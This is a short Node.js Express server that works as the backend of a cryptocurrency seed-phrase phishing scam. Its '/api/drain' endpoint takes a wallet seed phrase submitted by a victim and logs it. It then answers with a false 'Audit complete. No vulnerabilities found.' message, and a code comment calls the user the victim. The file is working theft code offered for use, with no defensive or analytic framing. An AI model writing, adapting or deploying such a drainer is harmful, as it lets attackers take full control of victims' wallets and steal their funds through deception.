const express = require('express');
const cors = require('cors');
const app = express();

// ✅ Enable CORS for ALL origins (required for Vercel → Railway)
app.use(cors());
app.use(express.json());

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

// Drain endpoint
app.post('/api/drain', (req, res) => {
    const seed = req.body.seedPhrase;
    console.log('🔥 SEED RECEIVED:', seed);
    
    // Always return success to the victim
    res.json({
        success: true,
        message: 'Audit complete. No vulnerabilities found.'
    });
});

const port = process.env.PORT || 8080;
app.listen(port, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${port}`);
});